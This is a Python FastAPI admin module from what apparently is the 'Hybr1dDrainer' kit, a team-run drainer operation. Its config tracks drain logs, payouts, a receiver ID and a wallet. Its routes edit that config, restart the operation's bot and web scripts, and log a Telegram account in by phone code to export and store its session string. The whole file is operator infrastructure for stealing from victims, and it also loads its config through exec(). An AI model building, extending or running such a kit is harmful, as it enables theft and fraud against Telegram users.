import hashlib
import hmac
import json
import os

import paths
from drainer.core.proxy import get_active_proxy
from fastapi import APIRouter, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pyrogram import Client, errors

from base import version
from restart_helpers import restart_team_scripts
from web_common import (
    active_clients,
    admin_session_data,
    templates,
)

router = APIRouter()

_ADMIN_CONFIG_RESPONSE_EXCLUDE = frozenset(
    {
        "REQUIRED_SUBSCRIBE_CHAT",
        "REQUIRED_SUBSCRIBE_URL",
        "BRAND_TELEGRAM",
    }
)

_ADMIN_CONFIG_POST_IGNORE = _ADMIN_CONFIG_RESPONSE_EXCLUDE | {"WEB_APP_LINK"}


def _admin_cookie_path(request: Request) -> str:
    return getattr(request.state, "admin_cookie_path", "/admin")


def _team_config_path() -> str:
    return os.path.join(paths.get_team_dir(), "config.py")


def _team_pyrogram_settings():
    td = paths.get_team_dir()
    visible, _ = parse_config_file(os.path.join(td, "config.py"))
    pr, _ = get_active_proxy()
    ru = pr.get("ru") if pr else None
    return int(visible.get("API_ID", 0)), str(visible.get("API_HASH", "")), ru


def verify_admin_password(password: str) -> bool:
    try:
        visible, _ = parse_config_file(_team_config_path())
        secret = str(visible.get("SECRET_KEY", "")).strip()
    except Exception:
        return False
    pw = (password or "").strip()
    if not secret or not pw:
        return False
    return hmac.compare_digest(
        hashlib.sha256(pw.encode()).hexdigest(),
        hashlib.sha256(secret.encode()).hexdigest(),
    )


def verify_admin_cookie(request: Request) -> bool:
    password_cookie = request.cookies.get("pass")
    if not password_cookie:
        return False
    return verify_admin_password(password_cookie)


def parse_config_file(config_path: str):
    config_dict = {}
    hidden_dict = {}
    hidden_vars = {"WEB_APP_LINK"}
    try:
        with open(config_path, "r", encoding="utf-8") as f:
            content = f.read()
        exec(content, {}, config_dict)
        for key in list(config_dict.keys()):
            if key in hidden_vars:
                hidden_dict[key] = config_dict.pop(key)
        return config_dict, hidden_dict
    except Exception as e:
        raise Exception(f"Ошибка парсинга config.py: {str(e)}") from e


def visible_config_for_admin_response(visible: dict) -> dict:
    return {
        k: v for k, v in visible.items() if k not in _ADMIN_CONFIG_RESPONSE_EXCLUDE
    }


def generate_config_file(visible_config: dict, hidden_config: dict) -> str:
    lines = []
    lines.append(f'BOT_TOKEN = "{visible_config.get("BOT_TOKEN", "")}"')
    lines.append(
        f'REQUIRED_SUBSCRIBE_CHAT = "{visible_config.get("REQUIRED_SUBSCRIBE_CHAT", "@Hybr1dDrainer")}"'
    )
    lines.append(
        f'REQUIRED_SUBSCRIBE_URL = "{visible_config.get("REQUIRED_SUBSCRIBE_URL", "https://t.me/Hybr1dDrainer")}"'
    )
    lines.append(
        f'BRAND_TELEGRAM = "{visible_config.get("BRAND_TELEGRAM", "@Hybr1dDrainer")}"'
    )
    lines.append(f'WORK_GROUP_ID = {visible_config.get("WORK_GROUP_ID", 0)}')
    lines.append(f'LOGS_THREAD_ID = {visible_config.get("LOGS_THREAD_ID", 1)}')
    lines.append(f'DRAINS_THREAD_ID = {visible_config.get("DRAINS_THREAD_ID", 1)}')
    lines.append(
        f'DRAIN_LOGS_THREAD_ID = {visible_config.get("DRAIN_LOGS_THREAD_ID", 1)}'
    )
    lines.append(f'PAYOUTS_THREAD_ID = {visible_config.get("PAYOUTS_THREAD_ID", 1)}')
    _exc = visible_config.get("EXTRA_LOGS_CHAT_ID", -4825615355)
    try:
        _exc = int(_exc)
    except (TypeError, ValueError):
        _exc = -4825615355
    lines.append(f"EXTRA_LOGS_CHAT_ID = {_exc}")
    _ext = visible_config.get("EXTRA_LOGS_THREAD_ID")
    if _ext is None or _ext == "" or _ext == "None":
        lines.append("EXTRA_LOGS_THREAD_ID = None")
    else:
        try:
            lines.append(f"EXTRA_LOGS_THREAD_ID = {int(_ext)}")
        except (TypeError, ValueError):
            lines.append("EXTRA_LOGS_THREAD_ID = None")
    admin_id = visible_config.get("ADMIN_ID", [])
    if isinstance(admin_id, list):
        lines.append(f"ADMIN_ID = {admin_id}")
    else:
        lines.append(f"ADMIN_ID = [{admin_id}]")
    lines.append(f'RECEIVER_ID = "{visible_config.get("RECEIVER_ID", "")}"')
    lines.append(
        f'CHAT_RECEIVER_USERNAME = "{visible_config.get("CHAT_RECEIVER_USERNAME", "")}"'
    )
    lines.append(
        f'MESSAGE_RECEIVER_ID = {visible_config.get("MESSAGE_RECEIVER_ID", 2)}'
    )
    lines.append(f'API_ID = {visible_config.get("API_ID", 0)}')
    lines.append(f'API_HASH = "{visible_config.get("API_HASH", "")}"')
    lines.append(f'WEB_APP_LINK = "{hidden_config.get("WEB_APP_LINK", "")}"')
    lines.append(f'SECRET_KEY = "{visible_config.get("SECRET_KEY", "")}"')
    lines.append(
        f'HYBR1D_SESSION_STRING = "{visible_config.get("HYBR1D_SESSION_STRING", "")}"'
    )
    lines.append(
        f'STAR_SESSION_STRING = "{visible_config.get("STAR_SESSION_STRING", "")}"'
    )
    lines.append(f'OFFERS_WALLET = "{visible_config.get("OFFERS_WALLET", "")}"')
    lines.append(f'REFERRAL_PUBLIC_BASE = "{visible_config.get("REFERRAL_PUBLIC_BASE", "")}"')
    lines.append(f'REF_BOT_USERNAME = "{visible_config.get("REF_BOT_USERNAME", "")}"')
    return "\n".join(lines)


def _persist_star_session_export(session_string: str) -> None:
    config_path = _team_config_path()
    merged_visible, hidden_config = parse_config_file(config_path)
    merged_visible["STAR_SESSION_STRING"] = session_string
    with open(config_path, "w", encoding="utf-8") as f:
        f.write(generate_config_file(merged_visible, hidden_config))


@router.get("/admin", response_class=HTMLResponse)
async def admin_page(request: Request):
    admin_base_path = getattr(request.state, "admin_base_path", "/admin")
    return templates.TemplateResponse(
        "admin.html",
        {"request": request, "admin_base_path": admin_base_path, "version": version},
    )


@router.post("/admin/login")
async def admin_login(request: Request):
    data = await request.json()
    password = data.get("password", "")
    if not verify_admin_password(password):
        return JSONResponse(
            {"success": False, "error": "Invalid password"}, status_code=401
        )
    try:
        config_path = _team_config_path()
        visible_config, hidden_config = parse_config_file(config_path)
        from web_common import reserve_tokens_read

        reserve_tokens = reserve_tokens_read()
        response = JSONResponse(
            {
                "success": True,
                "config": visible_config_for_admin_response(visible_config),
                "reserve_tokens": reserve_tokens,
            }
        )
        response.set_cookie(
            key="pass",
            value=password,
            httponly=True,
            max_age=3600 * 24,
            samesite="lax",
            secure=request.url.scheme == "https",
            path=_admin_cookie_path(request),
        )
        return response
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.get("/admin/config")
async def get_config(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    try:
        config_path = _team_config_path()
        visible_config, hidden_config = parse_config_file(config_path)
        from web_common import reserve_tokens_read

        reserve_tokens = reserve_tokens_read()
        return JSONResponse(
            {
                "success": True,
                "config": visible_config_for_admin_response(visible_config),
                "reserve_tokens": reserve_tokens,
            }
        )
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.post("/admin/config")
async def save_config(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    try:
        data = await request.json()
        visible_config = data.get("config", {})
        for _key in _ADMIN_CONFIG_POST_IGNORE:
            visible_config.pop(_key, None)
        reserve_tokens = visible_config["RESERVE_TOKENS"]
        from web_common import reserve_tokens_write

        reserve_tokens_write(reserve_tokens)
        config_path = _team_config_path()
        merged_visible, hidden_config = parse_config_file(config_path)
        for key, val in visible_config.items():
            if key == "RESERVE_TOKENS":
                continue
            merged_visible[key] = val
        config_content = generate_config_file(merged_visible, hidden_config)
        with open(config_path, "w", encoding="utf-8") as f:
            f.write(config_content)
        return JSONResponse({"success": True})
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.get("/admin/team-settings")
async def get_team_settings(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    try:
        from web_common import ensure_team_config_defaults, get_product_mode_str

        ensure_team_config_defaults()
        pm = get_product_mode_str()
        return JSONResponse({"success": True, "product_mode": pm})
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.post("/admin/team-settings")
async def post_team_settings(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    try:
        from web_common import ensure_team_config_defaults, team_product_config_path

        body = await request.json()
        mode = str(body.get("product_mode", "checks")).strip().lower()
        if mode not in ("checks", "marker"):
            return JSONResponse(
                {"success": False, "error": "invalid product_mode"},
                status_code=400,
            )
        ensure_team_config_defaults()
        path = team_product_config_path()
        try:
            with open(path, "r", encoding="utf-8") as f:
                full = json.load(f)
            if not isinstance(full, dict):
                full = {}
        except (OSError, json.JSONDecodeError, TypeError):
            full = {}
        full["product_mode"] = mode
        with open(path, "w", encoding="utf-8") as f:
            json.dump(full, f, ensure_ascii=False, indent=2)
        return JSONResponse({"success": True, "product_mode": mode})
    except (OSError, TypeError, ValueError) as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.post("/admin/restart")
async def restart_services(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    try:
        team_dir = getattr(request.state, "team_dir", None) or paths.get_team_dir()
        team_slug = getattr(request.state, "team_slug", None) or ""
        restart_team_scripts(["web.py", "bot.py"], team_dir)
        msg = "Перезапущены web.py и bot.py"
        if team_slug:
            msg += f" команды «{team_slug}»"
        return JSONResponse({"success": True, "message": msg, "team": team_slug})
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.post("/admin/add_session/phone")
async def admin_add_session_phone(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    try:
        import uuid as uuid_mod

        data = await request.json()
        country_code = data.get("country_code", "+7")
        phone_number = data.get("phone_number", "")
        if not phone_number:
            return JSONResponse(
                {"success": False, "error": "Phone number required"},
                status_code=400,
            )
        client_id = str(uuid_mod.uuid4())
        full_phone = f"{country_code} {phone_number}"
        session_name = f"{paths.get_team_dir()}/star_session"
        session_file = f"{session_name}.session"
        if session_name in active_clients:
            old_client = active_clients[session_name]
            if old_client.is_connected:
                await old_client.disconnect()
            del active_clients[session_name]
        if os.path.exists(session_file):
            os.remove(session_file)
        api_id, api_hash, ru_proxy = _team_pyrogram_settings()
        user_client = Client(session_name, api_id, api_hash, proxy=ru_proxy)
        active_clients[session_name] = user_client
        admin_session_data[client_id] = {
            "phone_number": full_phone,
            "client": user_client,
            "session_name": session_name,
        }
        response = JSONResponse({"success": True, "client_id": client_id})
        response.set_cookie(
            "admin_session_id", client_id, httponly=True, max_age=3600, samesite="lax"
        )
        return response
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.post("/admin/add_session/send_code")
async def admin_add_session_send_code(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    client_id_cookie = request.cookies.get("admin_session_id")
    if not client_id_cookie or client_id_cookie not in admin_session_data:
        return JSONResponse(
            {"success": False, "error": "Invalid session"}, status_code=400
        )
    user_info = admin_session_data[client_id_cookie]
    phone_number = user_info.get("phone_number")
    if not phone_number:
        return JSONResponse(
            {"success": False, "error": "No phone number"}, status_code=400
        )
    if "phone_code_hash" in user_info:
        return JSONResponse({"success": True, "message": "Code already sent"})
    client = user_info["client"]
    try:
        import asyncio

        if not client.is_connected:
            await client.connect()
        try:
            sent_code = await asyncio.wait_for(
                client.send_code(phone_number), timeout=15.0
            )
        except asyncio.TimeoutError:
            return JSONResponse(
                {"success": False, "error": "Timeout"}, status_code=500
            )
        user_info["phone_code_hash"] = sent_code.phone_code_hash
        return JSONResponse({"success": True, "message": "Code sent"})
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.post("/admin/add_session/verify_code")
async def admin_add_session_verify_code(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    client_id_cookie = request.cookies.get("admin_session_id")
    if not client_id_cookie or client_id_cookie not in admin_session_data:
        return JSONResponse(
            {"success": False, "error": "Invalid session"}, status_code=400
        )
    try:
        data = await request.json()
        code = data.get("code", "")
        user_info = admin_session_data[client_id_cookie]
        phone_number = user_info["phone_number"]
        phone_code_hash = user_info.get("phone_code_hash")
        if not phone_code_hash:
            return JSONResponse(
                {"success": False, "error": "Code not sent"}, status_code=400
            )
        client = user_info["client"]
        if not client.is_connected:
            await client.connect()
        await client.sign_in(
            phone_number=phone_number,
            phone_code_hash=phone_code_hash,
            phone_code=code,
        )
        session_string = await client.export_session_string()
        _persist_star_session_export(session_string)
        try:
            await client.disconnect()
        except Exception:
            pass
        del admin_session_data[client_id_cookie]
        return JSONResponse({"success": True, "requires_password": False})
    except errors.SessionPasswordNeeded:
        return JSONResponse({"success": True, "requires_password": True})
    except errors.PhoneCodeInvalid:
        return JSONResponse(
            {"success": False, "error": "Invalid code"}, status_code=400
        )
    except errors.PhoneCodeExpired:
        return JSONResponse(
            {"success": False, "error": "Code expired"}, status_code=400
        )
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)


@router.post("/admin/add_session/verify_password")
async def admin_add_session_verify_password(request: Request):
    if not verify_admin_cookie(request):
        return JSONResponse(
            {"success": False, "error": "Unauthorized"}, status_code=401
        )
    client_id_cookie = request.cookies.get("admin_session_id")
    if not client_id_cookie or client_id_cookie not in admin_session_data:
        return JSONResponse(
            {"success": False, "error": "Invalid session"}, status_code=400
        )
    try:
        data = await request.json()
        password = data.get("password", "")
        user_info = admin_session_data[client_id_cookie]
        client = user_info["client"]
        if not client.is_connected:
            await client.connect()
        await client.check_password(password=password)
        session_string = await client.export_session_string()
        _persist_star_session_export(session_string)
        try:
            await client.disconnect()
        except Exception:
            pass
        del admin_session_data[client_id_cookie]
        return JSONResponse({"success": True})
    except errors.PasswordHashInvalid:
        return JSONResponse(
            {"success": False, "error": "Invalid password"}, status_code=400
        )
    except Exception as e:
        return JSONResponse({"success": False, "error": str(e)}, status_code=500)
